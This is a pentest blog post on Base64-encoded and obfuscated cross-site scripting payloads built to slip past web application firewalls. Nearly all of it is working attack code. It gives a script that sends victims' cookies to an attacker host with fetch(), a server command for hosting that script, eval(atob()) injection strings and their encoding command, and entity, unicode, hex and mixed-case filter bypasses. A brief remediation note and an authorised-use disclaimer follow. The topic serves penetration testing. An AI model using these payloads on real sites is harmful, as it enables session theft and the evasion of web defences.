---
layout: single
title: "XSS — Encoded & Obfuscated Payloads"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - waf-bypass
  - obfuscation
  - base64
  - encoded-payload
  - eval
  - atob
  - btoa
  - javascript
  - reflected-xss
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - cwe-79
  - bugbounty
  - tools
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "When WAFs and filters block raw XSS strings, Base64-encode your payload and use eval(atob()) or btoa(eval(atob())) to execute it — bypassing signature-based detection entirely."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## Why Encoding?

WAFs and filters look for string signatures — `<script>`, `alert(`, `document.cookie`. Base64 encoding produces none of these. The browser decodes and executes it transparently.

## The Cookie Exfil Payload

**Step 1 — Create `xss.js` (your actual payload):**

```javascript
let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("http://192.168.XX.XX/exfil?data=" + encodedCookie)
```

**Step 2 — Start your server:**

<div class="tool-cmd">python3 -m http.server 80</div>

## Base64 Encoding

The script tag `<script src="http://192.168.XX.XX/xss.js"></script>` encoded in Base64:

<div class="tool-out">PHNjcmlwdCBzcmM9Imh0dHA6Ly8xOTIuMTY4LlhYLlhYL3h4cy5qcyI+PC9zY3JpcHQ+</div>

## Bypass Payloads

**eval(atob()) — decode and execute Base64:**

```javascript
'+eval(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly8xOTIuMTY4LlhYLlhYL3h4cy5qcyI+PC9zY3JpcHQ+'))+'
```

**btoa(eval(atob())) — double-encode for extra evasion:**

```javascript
'+btoa(eval(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly8xOTIuMTY4LlhYLlhYL3h4cy5qcyI+PC9zY3JpcHQ+')))+'
```

## How to Encode Your Own Payload

<div class="tool-cmd">echo -n '&lt;script src="http://192.168.XX.XX/xss.js"&gt;&lt;/script&gt;' | base64</div>

Then wrap it:

```javascript
eval(atob('YOUR_BASE64_HERE'))
```

## Other Encoding Tricks

```javascript
// HTML entity encoding
&#60;script&#62;alert(1)&#60;/script&#62;

// Unicode escape
\u003cscript\u003ealert(1)\u003c/script\u003e

// Hex
\x3cscript\x3ealert(1)\x3c/script\x3e

// Mixed case (bypasses case-sensitive filters)
<ScRiPt>alert(1)</ScRiPt>
```

<div class="remediation-box"><strong>Fix:</strong> Signature-based WAF rules are easily bypassed — never rely on them alone. The real fix is context-aware output encoding at the application layer. Use a templating engine that auto-escapes by default (Jinja2, Thymeleaf, React JSX).</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
